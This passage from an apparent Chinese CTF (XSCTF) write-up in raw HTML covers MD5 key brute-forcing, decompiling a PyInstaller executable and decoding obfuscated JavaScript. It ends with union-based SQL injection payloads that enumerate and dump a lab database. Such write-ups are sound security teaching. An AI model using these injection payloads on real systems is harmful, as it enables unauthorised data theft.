class="line">Stack[00001C64]:0000003589DCF5AB db  63h ; c</span><br><span class="line">Stack[00001C64]:0000003589DCF5AC db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5AD db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5AE db  36h ; 6</span><br><span class="line">Stack[00001C64]:0000003589DCF5AF db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5B0 db  61h ; a</span><br><span class="line">Stack[00001C64]:0000003589DCF5B1 db  63h ; c</span><br><span class="line">Stack[00001C64]:0000003589DCF5B2 db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5B3 db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5B4 db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5B5 db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5B6 db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5B7 db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5B8 db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5B9 db  36h ; 6</span><br><span class="line">Stack[00001C64]:0000003589DCF5BA db  34h ; 4</span><br><span class="line">Stack[00001C64]:0000003589DCF5BB db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5BC db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5BD db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5BE db  31h ; 1</span><br><span class="line">Stack[00001C64]:0000003589DCF5BF db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5C0 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5C1 db  64h ; d</span><br><span class="line">Stack[00001C64]:0000003589DCF5C2 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5C3 db  33h ; 3</span><br><span class="line">Stack[00001C64]:0000003589DCF5C4 db  34h ; 4</span><br><span class="line">Stack[00001C64]:0000003589DCF5C5 db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5C6 db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5C7 db  30h ; 0</span><br></pre></td></tr></table></figure><p>这段数据就是输入的测试数据<code>123</code>对应的md5值，而为了解密图像，输入的key需要满足一定条件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请输入你的key： 123</span><br><span class="line">MD5 的前三位数字与 key的本身值 不相等。注:数字范围为0--9</span><br></pre></td></tr></table></figure><p>这里需要注意的主要是<code>数字范围为0--9</code>指的是输入的key还是md5的值，还是两者皆是<br>答案是只有输入的key，因为作为循环异或的对象长度应该是一定的，而如果转换为十进制的话原本的md5编码的长度可能会变化，这一点也可以在先前对图像加密的代码中得出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*((_BYTE *)Buffer + i) ^= strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)(i % <span class="number">32</span> + a2), <span class="number">0</span>i64, <span class="number">16</span>);</span><br></pre></td></tr></table></figure><p>可以看到也是以32为周期的</p><p>所以现在的问题就是找到某三位数字，其md5的值的前三位与原本的值是相等的</p><p>生成正确的key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">            num = <span class="string">f&quot;<span class="subst">&#123;i*<span class="number">100</span>+j*<span class="number">10</span>+k:<span class="number">03</span>d&#125;</span>&quot;</span></span><br><span class="line">            c = hashlib.md5(num.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">            print(num, <span class="built_in">str</span>(c)[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(num) == <span class="built_in">str</span>(c)[<span class="number">0</span>:<span class="number">3</span>]:</span><br><span class="line">                print(num)</span><br></pre></td></tr></table></figure><p>这里有个坑，使用python实现md5编码还有一种先update再hexdigest的方法，那种方法在这里是行不通的<br><code>320</code><br>然后将key作为输入就可以得到解密后的图片了</p><p><code>flag&#123;pic_pic_is_so_easy!&#125;</code></p><h2 id="Ro1ling"><a href="#Ro1ling" class="headerlink" title="Ro1ling~"></a>Ro1ling~</h2><p>题目描述</p><ol><li>flag is rolling ~ flag is flying ~</li><li>press <code>q</code> to quit</li><li>tips: The flag format is <code>XSCTF\&#123;[ -~]+\&#125;</code></li></ol><p>运行程序，会出现弹幕一样飘过的文字<br>但是，在中止运行时出现了这样的报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;Ro1ling.py&quot;</span>, line <span class="number">97</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;curses\__init__.py&quot;</span>, line <span class="number">94</span>, <span class="keyword">in</span> wrapper</span><br><span class="line">  File <span class="string">&quot;Ro1ling.py&quot;</span>, line <span class="number">94</span>, <span class="keyword">in</span> main</span><br><span class="line">KeyboardInterrupt</span><br><span class="line">[<span class="number">21964</span>] Failed to execute script <span class="string">&#x27;Ro1ling&#x27;</span> due to unhandled exception!</span><br></pre></td></tr></table></figure><p>熟悉的Traceback，一眼就能看出来是python</p><p>所以这是一个使用python编写并打包的exe文件<br>能打包python的工具主要有<code>pyinstaller</code>等，这里使用对应的<code>pyinstxtractor</code>反编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py Ro1ling.exe</span><br></pre></td></tr></table></figure><p>运行以上命令之后就会在当前目录下生成一个文件夹，其中有同名的pyc文件<br>使用<code>uncompyle6</code>将pyc文件转换为py文件<br>但是报错了<br>使用在线网站的结果也是不完整的</p><p>上网查询之后找到这么一篇博客<br><a href="https://www.cnblogs.com/czlnb/p/16246759.html">python逆向实战：反编译python3 pyc文件 - 乘舟凉 - 博客园 (cnblogs.com)</a></p><p>里边有手动提取opcode的示例代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> uncompyle6.main <span class="keyword">import</span> decompile</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># version = (3, 8, 0)</span></span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sub_codeObject_list</span>(<span class="params">co</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [ins <span class="keyword">for</span> ins <span class="keyword">in</span> <span class="built_in">list</span>(dis.Bytecode(co)) <span class="keyword">if</span> <span class="string">&quot;code object&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(ins.argval)]</span><br><span class="line"></span><br><span class="line">outstream = sys.stdout</span><br><span class="line">showasm = <span class="literal">None</span></span><br><span class="line">showast = <span class="literal">False</span></span><br><span class="line">showgrammar = <span class="literal">False</span></span><br><span class="line">source_encoding = <span class="literal">None</span></span><br><span class="line">mapstream = <span class="literal">None</span></span><br><span class="line">do_fragments = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xdis <span class="keyword">import</span> load_module</span><br><span class="line">filename = <span class="string">&quot;Ro1ling.pyc&quot;</span></span><br><span class="line">code_objects = &#123;&#125;</span><br><span class="line">(version, timestamp, magic_int, co, is_pypy, source_size, sip_hash) = load_module(</span><br><span class="line">    filename, code_objects</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decompile_part</span>(<span class="params">co,father_name=<span class="literal">None</span>,outstream=sys.stdout</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> father_name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            name = <span class="string">&quot;%s.%s&quot;</span> % (father_name,co.co_name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            name = co.co_name</span><br><span class="line">        outstream.write(<span class="string">&quot;\n# %s ____________________________________________\n&quot;</span> % name)</span><br><span class="line">        decompile(</span><br><span class="line">            version,</span><br><span class="line">            co,</span><br><span class="line">            outstream,</span><br><span class="line">            <span class="literal">None</span>,</span><br><span class="line">            <span class="literal">False</span>,</span><br><span class="line">            timestamp,</span><br><span class="line">            <span class="literal">False</span>,</span><br><span class="line">            <span class="literal">None</span>,</span><br><span class="line">            code_objects=&#123;&#125;,</span><br><span class="line">            source_size=source_size,</span><br><span class="line">            is_pypy=<span class="literal">False</span>,</span><br><span class="line">            magic_int=magic_int,</span><br><span class="line">            mapstream=<span class="literal">None</span>,</span><br><span class="line">            do_fragments=<span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        bytecode = get_sub_codeObject_list(co)</span><br><span class="line">        <span class="keyword">for</span> code <span class="keyword">in</span> bytecode:</span><br><span class="line">            co = code.argval</span><br><span class="line">            decompile_part(co,name,outstream)</span><br><span class="line">decompile_part(co)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="string">&#x27;utf8&#x27;</span>) <span class="comment">#改变标准输出的默认编码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        byteCode = fp.read()[<span class="number">16</span>:]</span><br><span class="line">   </span><br><span class="line">    co  = marshal.loads(byteCode)</span><br><span class="line">    dis.dis(co)</span><br></pre></td></tr></table></figure><p>先运行第一份代码，再运行第二份代码，就可以得到opcode的输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> 28          72 BUILD_LIST               0</span><br><span class="line">             74 LOAD_CONST               6 ((<span class="string">&#x27;Summer in the hills&#x27;</span>, <span class="string">&#x27;Those hazy days I do remember&#x27;</span>, <span class="string">&#x27;We were running still&#x27;</span>, <span class="string">&#x27;Had the whole world at our feet&#x27;</span>, <span class="string">&#x27;Watching seasons change&#x27;</span>, <span class="string">&#x27;Our roads were lined with adventure&#x27;</span>, <span class="string">&#x27;Mountains in the way&#x27;</span>, <span class="string">&quot;Couldn&#x27;t keep us from the sea&quot;</span>, <span class="string">&#x27;Here we stand open arms&#x27;</span>, <span class="string">&#x27;This is home where we are&#x27;</span>, <span class="string">&#x27;Ever strong in the world that we made&#x27;</span>, <span class="string">&#x27;I still hear you in the breeze&#x27;</span>, <span class="string">&#x27;See your shadows in the trees&#x27;</span>, <span class="string">&#x27;Holding on, memories never change&#x27;</span>))</span><br><span class="line">             76 CALL_FINALLY             1 (to 79)</span><br><span class="line">             78 STORE_DEREF              2 (phrases)</span><br><span class="line"></span><br><span class="line"> 29          80 LOAD_CONST               7 (<span class="string">&#x27;𝙓𝙎𝘾𝙏𝙁&#123;𝙁0𝙧_0𝙣𝙘3_𝙮0𝙪_𝙝4𝙫3_7𝙖57𝙚𝙙_𝙛𝙡𝙞𝙜                    𝙝𝙩_𝙮0𝙪_𝙬1𝙡𝙡_�</span></span><br><span class="line"><span class="string">44𝙡𝙠_7𝙝3_3𝙖𝙧7𝙝_𝙬17𝙝_𝙮0𝙪𝙧_3𝙮35_7𝙪𝙧𝙣3𝙙_5𝙠𝙮𝙬4𝙧𝙙5&#125;&#x27;</span>)</span><br><span class="line">             82 STORE_DEREF              3 (secret_message)</span><br><span class="line"></span><br><span class="line"> 46          84 LOAD_DEREF               4 (stdscr)</span><br><span class="line">        &gt;&gt;   86 LOAD_METHOD              7 (nodelay)</span><br><span class="line">             88 LOAD_CONST               8 (True)</span><br><span class="line">             90 CALL_METHOD              1</span><br><span class="line">             92 POP_TOP</span><br></pre></td></tr></table></figure><p>其中因为命令行的编码原因这里的flag其实是乱码（因此我还分析了一下opcode有没有加密的过程，事实证明没有）<br>但是opcode转换为py代码的方式没有找到</p><p>在复制到其他文本编辑器之后就可以看到flag了（要手打，因为格式写了只支持ascii编码的字符，这里是unicode）</p><p><code>XSCTF&#123;F0r_0nc3_y0u_h4v3_7a57ed_flight_y0u_w1ll_w4lk_7h3_3ar7h_w17h_y0ur_3y35_7urn3d_5kyw4rd5&#125;</code><br><del>这flag真长啊</del></p><h2 id="Running"><a href="#Running" class="headerlink" title="Running~"></a>Running~</h2><p>一个没有后缀的文件，内容是js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x21b6c9=_0xe50d;<span class="function"><span class="keyword">function</span> <span class="title">_0xe50d</span>(<span class="params">_0x483c4e,_0x3bb3e1</span>)</span>&#123;<span class="keyword">var</span> _0x1173b4=_0x1173();<span class="keyword">return</span> _0xe50d=<span class="function"><span class="keyword">function</span>(<span class="params">_0xe50d90,_0x1a4c11</span>)</span>&#123;_0xe50d90=_0xe50d90-<span class="number">0x105</span>;<span class="keyword">var</span> _0x33ff31=_0x1173b4[_0xe50d90];<span class="keyword">return</span> _0x33ff31;&#125;,_0xe50d(_0x483c4e,_0x3bb3e1);&#125;<span class="function"><span class="keyword">function</span> <span class="title">_0x1173</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> _0x2badaa=[<span class="string">&#x27;920aGutvi&#x27;</span>,<span class="string">&#x27;517wlRFdu&#x27;</span>,<span class="string">&#x27;221112hjXCvb&#x27;</span>,<span class="string">&#x27;169436bqkkfr&#x27;</span>,<span class="string">&#x27;8dhAXCJ&#x27;</span>,<span class="string">&#x27;12838203EfwKcG&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;CgogX18gICBfXyAgIF9fX19fICAgIF9fX19fICAgX19fX19fXyAgIF9fX19fXyAgICAgX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fXyAgICAgICAgICAgXyAgIF8gICAgIF8gICAgICAgICAgIF8gICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICBfXyAgICAgICAgICAgICAgICAgIF8gIF8gICAgIF8gICAgIF8gICAgX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX18gICAgICAgICAgICAgX19fXyAgICBfICAgICAgICBfXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgXyAgICAgICAgICAgICAgICAgIF9fICAgCiBcIFwgLyAvICAvIF9fX198ICAvIF9fX198IHxfXyAgIF9ffCB8ICBfX19ffCAgIC8gLyAgICAgL1wgICAgICAgICAgICAgICAgICAgICAgfF8gICBffCAgICAgICAgIChfKSB8IHwgICAoXykgICAgICAgICB8IHwgICAgICAgICAgfCAgX19fX3wgICAgICAgICAgICAgICAgL18gfCAgICAgICAgICAgICAgICB8IHx8IHwgICB8IHwgICAoXykgIC8gXyBcICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gX3wgICAgICAgICAgIC8gX18gXCAgfCB8ICAgICAgLyBffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgfCAgIChfKSAgICAgICAgICAgICAgICAgXCBcICAKICBcIFYgLyAgfCAoX19fICAgfCB8ICAgICAgICAgfCB8ICAgIHwgfF9fICAgICB8IHwgICAgIC8gIFwgICAgIF8gX18gICAgICAgICAgICAgIHwgfCAgICBfIF9fICAgIF8gIHwgfF8gICBfICAgIF9fIF8gIHwgfCAgICAgICAgICB8IHxfXyAgICBfXyAgX18gIF8gX18gICAgfCB8ICAgX19fICAgIF8gX18gIHwgfHwgfF8gIHwgfF8gICBfICB8IHwgfCB8ICBfIF9fICAgICAgICAgICAgICBfX18gICB8IHxfICAgICAgICAgICB8IHwgIHwgfCB8IHxfXyAgIHwgfF8gICBfICAgXyAgIF9fXyAgICBfX18gICAgX18gXyAgfCB8XyAgIF8gICAgX19fICAgIF8gX18gICAgfCB8IAogICA+IDwgICAgXF9fXyBcICB8IHwgICAgICAgICB8IHwgICAgfCAgX198ICAgLyAvICAgICAvIC9cIFwgICB8ICdfIFwgICAgICAgICAgICAgfCB8ICAgfCAnXyBcICB8IHwgfCBfX3wgfCB8ICAvIF9gIHwgfCB8ICAgICAgICAgIHwgIF9ffCAgIFwgXC8gLyB8ICdfIFwgICB8IHwgIC8gXyBcICB8ICdfX3wgfF9fICAgX3wgfCBfX3wgfCB8IHwgfCB8IHwgfCAnXyBcICAgICAgICAgICAgLyBfIFwgIHwgIF98ICAgICAgICAgIHwgfCAgfCB8IHwgJ18gXCAgfCAgX3wgfCB8IHwgfCAvIF9ffCAgLyBfX3wgIC8gX2AgfCB8IF9ffCB8IHwgIC8gXyBcICB8ICdfIFwgICAgXCBcCiAgLyAuIFwgICBfX19fKSB8IHwgfF9fX18gICAgIHwgfCAgICB8IHwgICAgICBcIFwgICAgLyBfX19fIFwgIHwgfCB8IHwgICAgICAgICAgIF98IHxfICB8IHwgfCB8IHwgfCB8IHxfICB8IHwgfCAoX3wgfCB8IHwgICAgICAgICAgfCB8X19fXyAgID4gIDwgIHwgfF8pIHwgIHwgfCB8IChfKSB8IHwgfCAgICAgICB8IHwgICB8IHxfICB8IHwgfCB8X3wgfCB8IHwgfCB8ICAgICAgICAgIHwgKF8pIHwgfCB8ICAgICAgICAgICAgfCB8X198IHwgfCB8XykgfCB8IHwgICB8IHxffCB8IFxfXyBcIHwgKF9fICB8IChffCB8IHwgfF8gIHwgfCB8IChfKSB8IHwgfCB8IHwgICAvIC8KIC9fLyBcX1wgfF9fX19fLyAgIFxfX19fX3wgICAgfF98ICAgIHxffCAgICAgICB8IHwgIC9fLyAgICBcX1wgfF98IHxffCAgICAgICAgICB8X19fX198IHxffCB8X3wgfF98ICBcX198IHxffCAgXF9fLF98IHxffCAgICAgICAgICB8X19fX19ffCAvXy9cX1wgfCAuX18vICAgfF98ICBcX19fLyAgfF98ICAgICAgIHxffCAgICBcX198IHxffCAgXF9fXy8gIHxffCB8X3wgICAgICAgICAgIFxfX18vICB8X3wgICAgICAgICAgICAgXF9fX18vICB8Xy5fXy8gIHxffCAgICBcX18sX3wgfF9fXy8gIFxfX198ICBcX18sX3wgIFxfX3wgfF98ICBcX19fLyAgfF98IHxffCAgfCB8IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcX1wgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICB8IHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19fX19fICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgIHxffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxfX19fX198ICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCg==&#x27;</span>,<span class="string">&#x27;3076824IERKkW&#x27;</span>,<span class="string">&#x27;6626otVnDv&#x27;</span>,<span class="string">&#x27;4488330eyQBas&#x27;</span>,<span class="string">&#x27;7196435AHLNnm&#x27;</span>];_0x1173=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> _0x2badaa;&#125;;<span class="keyword">return</span> _0x1173();&#125;(<span class="function"><span class="keyword">function</span>(<span class="params">_0x3fa77a,_0x506be4</span>)</span>&#123;<span class="keyword">var</span> _0x324ad3=_0xe50d,_0x1b9807=_0x3fa77a();<span class="function"><span class="title">while</span>(<span class="params">!![]</span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">var</span> _0x5cf5b7=-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x107</span>))/<span class="number">0x1</span>*(-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10f</span>))/<span class="number">0x2</span>)+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10e</span>))/<span class="number">0x3</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x109</span>))/<span class="number">0x4</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x105</span>))/<span class="number">0x5</span>+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x110</span>))/<span class="number">0x6</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10b</span>))/<span class="number">0x7</span>*(<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10a</span>))/<span class="number">0x8</span>)+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x108</span>))/<span class="number">0x9</span>*(<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x106</span>))/<span class="number">0xa</span>);<span class="keyword">if</span>(_0x5cf5b7===_0x506be4)<span class="keyword">break</span>;<span class="keyword">else</span> _0x1b9807[<span class="string">&#x27;push&#x27;</span>](_0x1b9807[<span class="string">&#x27;shift&#x27;</span>]());&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x29c073</span>)</span>&#123;_0x1b9807[<span class="string">&#x27;push&#x27;</span>](_0x1b9807[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;&#125;(_0x1173,<span class="number">0xf2d11</span>),<span class="built_in">console</span>[_0x21b6c9(<span class="number">0x10c</span>)](atob(_0x21b6c9(<span class="number">0x10d</span>))));</span><br></pre></td></tr></table></figure><p>直接复制到浏览器控制台</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__   __   _____    _____   _______   ______     __                              _____           _   _     _           _            ______                  __                  _  _     _     _    ___                              __             ____    _        __                                _     _                  __   </span><br><span class="line">\ \ &#x2F; &#x2F;  &#x2F; ____|  &#x2F; ____| |__   __| |  ____|   &#x2F; &#x2F;     &#x2F;\                      |_   _|         (_) | |   (_)         | |          |  ____|                &#x2F;_ |                | || |   | |   (_)  &#x2F; _ \                            &#x2F; _|           &#x2F; __ \  | |      &#x2F; _|                              | |   (_)                 \ \  </span><br><span class="line"> \ V &#x2F;  | (___   | |         | |    | |__     | |     &#x2F;  \     _ __              | |    _ __    _  | |_   _    __ _  | |          | |__    __  __  _ __    | |   ___    _ __  | || |_  | |_   _  | | | |  _ __              ___   | |_           | |  | | | |__   | |_   _   _   ___    ___    __ _  | |_   _    ___    _ __    | | </span><br><span class="line">  &gt; &lt;    \___ \  | |         | |    |  __|   &#x2F; &#x2F;     &#x2F; &#x2F;\ \   | &#39;_ \             | |   | &#39;_ \  | | | __| | |  &#x2F; _&#96; | | |          |  __|   \ \&#x2F; &#x2F; | &#39;_ \   | |  &#x2F; _ \  | &#39;__| |__   _| | __| | | | | | | | &#39;_ \            &#x2F; _ \  |  _|          | |  | | | &#39;_ \  |  _| | | | | &#x2F; __|  &#x2F; __|  &#x2F; _&#96; | | __| | |  &#x2F; _ \  | &#39;_ \    \ \</span><br><span class="line"> &#x2F; . \   ____) | | |____     | |    | |      \ \    &#x2F; ____ \  | | | |           _| |_  | | | | | | | |_  | | | (_| | | |          | |____   &gt;  &lt;  | |_) |  | | | (_) | | |       | |   | |_  | | | |_| | | | | |          | (_) | | |            | |__| | | |_) | | |   | |_| | \__ \ | (__  | (_| | | |_  | | | (_) | | | | |   &#x2F; &#x2F;</span><br><span class="line">&#x2F;_&#x2F; \_\ |_____&#x2F;   \_____|    |_|    |_|       | |  &#x2F;_&#x2F;    \_\ |_| |_|          |_____| |_| |_| |_|  \__| |_|  \__,_| |_|          |______| &#x2F;_&#x2F;\_\ | .__&#x2F;   |_|  \___&#x2F;  |_|       |_|    \__| |_|  \___&#x2F;  |_| |_|           \___&#x2F;  |_|             \____&#x2F;  |_.__&#x2F;  |_|    \__,_| |___&#x2F;  \___|  \__,_|  \__| |_|  \___&#x2F;  |_| |_|  | | </span><br><span class="line">                                               \_\                     ______                                             ______                  | |                                                             ______                 ______                                                                                &#x2F;_&#x2F;  </span><br><span class="line">                                                                      |______|                                           |______|                 |_|                                                            |______|               |______|                                                                                    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拉伸一下就可以看到flag（换成不会自动换行的文本编辑软件，如notepad++）</p><p><code>XSCTF&#123;An_Initial_Exp1or4ti0n_of_Obfuscation&#125;</code></p><h2 id="saveSaofe1a-partA"><a href="#saveSaofe1a-partA" class="headerlink" title="saveSaofe1a_partA"></a>saveSaofe1a_partA</h2><p>考sql注入<br>测试一下发现是字符型查询，并且存在联合注入</p><ul><li>首先查询当前数据库</li><li>然后查询该数据库下的表</li><li>然后查询表下的字段</li><li>根据题目提示，逐个翻表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=&#x27;</span>student<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;class1&#x27;</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class1#</span></span><br><span class="line"><span 